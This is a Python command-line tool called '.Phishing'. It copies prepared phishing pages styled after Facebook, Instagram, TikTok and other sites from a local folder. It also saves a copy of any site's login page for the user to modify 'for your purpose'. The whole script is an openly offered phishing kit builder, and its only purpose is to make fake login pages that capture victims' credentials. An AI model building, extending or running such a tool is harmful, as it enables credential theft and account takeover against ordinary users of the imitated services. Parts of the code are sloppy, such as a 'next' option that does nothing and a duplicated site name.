import os
from colorama import Fore
import webbrowser
import shutil
import requests
from bs4 import BeautifulSoup

def title():
    logo = (
        "                "+Fore.LIGHTCYAN_EX   +"             _     _     _     _                  \n"
        "                "+Fore.LIGHTCYAN_EX   +"            | |   (_)   | |   (_)                 \n"
        "                "+Fore.LIGHTCYAN_EX   +"       _ __ | |__  _ ___| |__  _ _ __   __ _      \n"
        "                "+Fore.LIGHTCYAN_EX   +"      | '_ \| '_ \| / __| '_ \| | '_ \ / _` |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"     _| |_) | | | | \__ \ | | | | | | | (_| |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"    (_) .__/|_| |_|_|___/_| |_|_|_| |_|\__, |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"      | |                               __/ |     \n"
        "                "+Fore.LIGHTCYAN_EX   +"      |_|                              |___/      \n"
        "\n"
        "             "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                Welcome to .Phishing.               |\n"
        "             "+Fore.LIGHTCYAN_EX+"|           To see the Commands, type "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"help"+Fore.LIGHTRED_EX +"]"+Fore.LIGHTCYAN_EX +".        |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                  Use Responsibly!                  |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + logo)

def show_help():
    help = (
        "\n"
        "             "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"1"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Site List                       |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"2"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Github Repository               |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"3"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Clone Site                      |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"help"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Show commands                |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"clear"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Clear the screen            |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Close Program                |\n"
        "             "+Fore.LIGHTCYAN_EX+"|                                                    |\n"
        "             "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + help)

def site_list():
    current_script_dir = os.path.dirname(os.path.abspath(__file__))
    site_folder = os.path.join(current_script_dir, "site")
    site = (
        "             "+Fore.LIGHTCYAN_EX   +"                      _____ _ _               \n"
        "             "+Fore.LIGHTCYAN_EX   +"                     / ____(_) |              \n"
        "             "+Fore.LIGHTCYAN_EX   +"                     | (___  _| |_ ___ ___    \n"
        "             "+Fore.LIGHTCYAN_EX   +"                      \___ \| | __/ _ \ __|   \n"
        "             "+Fore.LIGHTCYAN_EX   +"                      ____) | | |_  __\__ \   \n"
        "             "+Fore.LIGHTCYAN_EX   +"                     |_____/|_|\__\___|___/   \n"
        "\n"
        "             "+Fore.LIGHTCYAN_EX   +"                       Use Responsibly!           "+Fore.LIGHTCYAN_EX +"         \n"
        "             "+Fore.LIGHTWHITE_EX   +"  __________________  __________________  __________________              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [01] Facebook  |  | [21] Site List |  | [41] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [02] Twitter   |  | [22] Site List |  | [42] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [03] Instagram |  | [23] Site List |  | [43] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [04] LinkedIn  |  | [24] Site List |  | [44] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [05] YouTube   |  | [25] Site List |  | [45] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [06] Pinterest |  | [26] Site List |  | [46] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [07] Snapchat  |  | [27] Site List |  | [47] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [08] Reddit    |  | [28] Site List |  | [48] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [09] Tumblr    |  | [29] Site List |  | [49] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [10] TikTok    |  | [30] Site List |  | [50] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [11] Tumblr    |  | [31] Site List |  | [51] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [12] Wix       |  | [32] Site List |  | [52] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [13] Site List |  | [33] Site List |  | [53] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [14] Site List |  | [34] Site List |  | [54] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [15] Site List |  | [35] Site List |  | [55] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [16] Site List |  | [36] Site List |  | [56] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [17] Site List |  | [37] Site List |  | [57] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [18] Site List |  | [38] Site List |  | [58] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [19] Site List |  | [39] Site List |  | [59] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  | [20] Site List |  | [40] Site List |  | [60] Site List |              \n"
        "             "+Fore.LIGHTWHITE_EX   +"  |________________|  |________________|  |________________|              \n"
        "\n"
        "               "+Fore.LIGHTCYAN_EX   +"                      Next Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"next"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 
        "               "+Fore.LIGHTCYAN_EX   +"                      Exit Page "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"]                    "+Fore.LIGHTCYAN_EX   +"\n" 

        "\n"
    )
    print(Fore.LIGHTCYAN_EX + site)
    while True:
        choice = input("Enter your choice [01-60]: ").strip().lower()

        if choice == "next":
            pass
        elif choice == "exit":
            break
        else:
            try:
                choice_num = int(choice)
                if 1 <= choice_num <= 60:
                    file_name = f"{choice_num:02d}"
                    file_found = False

                    for file in os.listdir(site_folder):
                        if file.startswith(file_name) and os.path.isfile(os.path.join(site_folder, file)):
                            source_file_path = os.path.join(site_folder, file)

                            destination_folder = input("Enter the destination folder path: ").strip()
                            destination_file_path = os.path.join(destination_folder, file)

                            shutil.copyfile(source_file_path, destination_file_path)
                            print(f"File '{file}' downloaded to your computer.")
                            file_found = True
                            break
                    
                    if not file_found:
                        print(f"Error: File with the number '{file_name}' not found in the 'sites' folder.")
                else:
                    print("Error: Invalid choice. Please enter a number between 01 and 30.")
            except ValueError:
                print("Error: Invalid input. Please enter a number between 01 and 60.")

def open_github_repository():
    url = "https://github.com/phishing-project/.phishing"
    webbrowser.open(url)

def site_clone():
    clone = (
        "\n"
        "       "+Fore.LIGHTCYAN_EX+"┏▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┒\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                                                   |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"        Enter the URL of the site's login page.    |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"           After you have placed the page,         |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"         be sure to change the code for use.       |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                  "+Fore.LIGHTRED_EX +"["+Fore.LIGHTWHITE_EX +"exit"+Fore.LIGHTRED_EX +"] "+Fore.LIGHTCYAN_EX +"Exit Page                 |\n"
        "       "+Fore.LIGHTCYAN_EX+"| "+Fore.LIGHTCYAN_EX   +"                                                   |\n"
        "       "+Fore.LIGHTCYAN_EX+"┗▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬┚\n"
        "\n"
    )
    print(Fore.LIGHTCYAN_EX + clone)
    url = input("Enter the URL of the website you want to clone: ").strip()

    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        html_content = str(soup.prettify())
        css_content = ""
        css_tags = soup.find_all('style')
        for tag in css_tags:
            css_content += str(tag) + "\n"

        filename = input("Enter the filename (without extension) for the cloned HTML: ").strip()
        destination_folder = input("Enter the destination folder path: ").strip()

        html_filename = filename + ".html"
        css_filename = filename + ".css"

        html_file_path = os.path.join(destination_folder, html_filename)
        css_file_path = os.path.join(destination_folder, css_filename)

        with open(html_file_path, 'w', encoding='utf-8') as html_file:
            html_file.write(html_content)

        with open(css_file_path, 'w', encoding='utf-8') as css_file:
            css_file.write(css_content)

        print(f"Website cloned successfully. HTML file: {html_file_path}")
        print(f"CSS file: {css_file_path}")
        print(f"Remember to change the code for your purpose.")


    except requests.exceptions.RequestException as e:
        print(f"Error: Failed to fetch the website. {e}")
    except Exception as e:
        print(f"Error: {e}")

def main():
    title()
    while True:
        user_input = input("~/.phishing $ ").strip().lower()

        if user_input == "help":
            show_help()
        if user_input == "1":
            site_list()
        if user_input == "3":
            site_clone()
        elif user_input == "2":
            open_github_repository()
        elif user_input == "clear":
            if os.name == 'nt':  # Windows
                os.system('cls')
            else:  # Unix (Linux/Mac)
                os.system('clear')
            title()
        elif user_input == "exit":
            print("Exiting .Phishing.")
            break

if __name__ == "__main__":
    main()